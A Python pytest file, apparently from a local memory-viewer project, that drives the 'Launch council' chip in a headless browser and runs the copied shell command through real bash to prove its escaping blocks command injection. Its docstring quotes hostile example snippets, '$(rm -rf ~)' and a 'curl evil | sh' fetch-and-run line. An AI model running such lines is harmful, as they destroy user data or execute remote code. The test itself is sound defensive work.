"""Security guard: the topology "Launch council on this topic" chip builds a SHELL
command from corpus-derived basin text that the user COPIES and PASTES INTO THEIR
SHELL — so its escaping must actually neutralize injection, verified against real
bash, not merely be present in source.

The chip (memory_viewer.py:2036) copies
``trinity-local council --task "<escapeBashArg(seedText)>"`` where ``seedText`` is
``basin.representatives[0].headline||snippet`` — text from CAPTURED CHATS, the same
attacker-influenceable corpus the memory-viewer XSS guards treat as hostile
([[memory_viewer_xss_real_browser]]). Unlike XSS (sandboxed page), THIS sink is the
user's interactive shell: a snippet like ``$(rm -rf ~)`` or ``"; curl evil | sh; "``
that isn't escaped becomes an executable payload the moment the user pastes the
"helpful" command.

`test_memory_viewer` only string-asserts ``escapeBashArg(seedText)`` is CALLED — it
never proves escapeBashArg WORKS. That's the #287/#288 lesson: a sanitizer must be
tested with real adversarial vectors at its real sink, not just shown to be wired.

This drives the actual chip (seed the gate's synthetic topology, inject an
adversarial-but-HARMLESS payload into b00's representative, click b00's node, read
the chip's launch command) and verifies injection-safety against REAL bash: swap
the binary for ``printf %s`` and run the copied ``"..."`` argument through bash —
if the escaping is correct it prints the LITERAL payload (no command substitution,
no quote-breakout); a hole would expand ``$(echo PWND)`` / run ``echo BREAKOUT`` and
the round-trip would differ. Payloads are pure ``echo`` so even a total escaping
failure only prints harmless strings (which the assertion detects), never harms.

Mutation-proven: drop the ``$`` (or ``"``) escape from escapeBashArg → bash expands
``$(echo PWND1)`` / the quote breaks out → the round-trip no longer equals the
literal payload → this reds. (Verified by hand: the live chip escapes
``$``→``\\$``, `` ` ``→`` \\` ``, ``"``→``\\"``; bash prints the payload verbatim.)

Slow + browser marked; skips without Playwright/chromium or without bash.
"""
from __future__ import annotations

import importlib.util
import json
import shutil
import subprocess
from pathlib import Path

import pytest

pytestmark = [pytest.mark.slow, pytest.mark.browser]

_SEEDER = Path(__file__).resolve().parents[1] / "scripts" / "seed_synthetic_home.py"
# Harmless but injection-shaped: command substitution ($()  / backticks), a
# double-quote breakout attempt, and a trailing-backslash edge — all echo-only.
_PAYLOAD = 'redesign $(echo PWND1) and `echo PWND2` then "; echo BREAKOUT; " ok\\'
_PREFIX = 'trinity-local council --task '


def _load_seeder():
    spec = importlib.util.spec_from_file_location("seed_home_for_shellsafe", _SEEDER)
    assert spec and spec.loader
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def test_launch_chip_command_is_shell_injection_safe(tmp_path, monkeypatch):
    pytest.importorskip("playwright.sync_api")
    from playwright.sync_api import sync_playwright

    if not shutil.which("bash"):
        pytest.skip("bash not available to verify the escaping against a real shell")

    home = tmp_path / "trinity"
    home.mkdir()
    monkeypatch.setenv("TRINITY_HOME", str(home))
    monkeypatch.setenv("TRINITY_AUTOSCAN_DISABLED", "1")

    # Use the gate's synthetic seeder for a topology that actually renders nodes,
    # then inject the adversarial payload into b00's representative (the corpus text
    # the chip seeds its command from).
    _load_seeder().seed(home)
    topics_path = home / "memories" / "topics.json"
    obj = json.loads(topics_path.read_text())
    obj["basins"][0]["representatives"] = [{"id": "r0", "snippet": _PAYLOAD}]
    topics_path.write_text(json.dumps(obj), encoding="utf-8")
    from trinity_local.memory_viewer import write_memory_viewer

    mv = write_memory_viewer()

    with sync_playwright() as p:
        try:
            browser = p.chromium.launch()
        except Exception as exc:  # pragma: no cover - env-dependent
            pytest.skip(f"no launchable chromium: {exc}")
        try:
            page = browser.new_page(viewport={"width": 1400, "height": 1100})
            page.goto(f"file://{mv}?file=topics.json", wait_until="load")
            page.wait_for_timeout(1600)  # d3 mounts the basin nodes
            # Click b00's node (opens the detail panel + renders the launch chip).
            page.evaluate(
                """() => {
                  const c = [...document.querySelectorAll('#content svg circle')]
                    .find(x => x.__data__ && x.__data__.id === 'b00');
                  if (c) c.dispatchEvent(new MouseEvent('click', { bubbles: true }));
                }"""
            )
            page.wait_for_timeout(600)
            # The chip's title is "Copy: <launchCmd>" — the exact text copied.
            cmd = page.evaluate(
                """() => {
                  const chip = document.querySelector('.topics-launch-chip');
                  return chip ? chip.title.replace(/^Copy: /, '') : '';
                }"""
            )
        finally:
            browser.close()

    assert cmd.startswith(_PREFIX), (
        f"the launch chip didn't render its council command (got {cmd!r}) — the "
        "node-click → detail → chip path broke, so the escaping is unverified"
    )
    # The metacharacters must be escaped in the copied command (fast structural check).
    assert "\\$(echo PWND1)" in cmd, f"the $ was not escaped: {cmd!r}"
    assert "\\`echo PWND2\\`" in cmd, f"the backtick was not escaped: {cmd!r}"
    assert '\\"' in cmd, f"the double-quote was not escaped: {cmd!r}"

    # The rigorous oracle: run the copied "..." argument through REAL bash via
    # `printf %s`. Correct escaping → bash prints the LITERAL payload (no command
    # substitution, no breakout). A hole → $(...)/`...` expand or the quote breaks.
    quoted = cmd[len(_PREFIX):]
    proc = subprocess.run(["bash", "-c", f"printf %s {quoted}"], capture_output=True, text=True)
    assert proc.returncode == 0, f"bash failed to parse the copied command: {proc.stderr[:200]!r}"
    assert proc.stdout == _PAYLOAD, (
        "the copied council command is NOT shell-injection-safe: pasting it does "
        f"not yield the literal task text. bash produced {proc.stdout!r} from the "
        f"payload {_PAYLOAD!r} — escapeBashArg let a metacharacter through (command "
        "substitution or a quote breakout), so a crafted basin snippet becomes an "
        "executable payload when the user pastes the command."
    )
    # Belt-and-suspenders: the harmless markers must NOT have executed (would mean
    # $(echo PWND) / echo BREAKOUT ran instead of staying literal).
    assert "echo PWND1" in proc.stdout and "echo BREAKOUT" in proc.stdout, (
        f"the injection markers were consumed/expanded rather than kept literal: {proc.stdout!r}"
    )
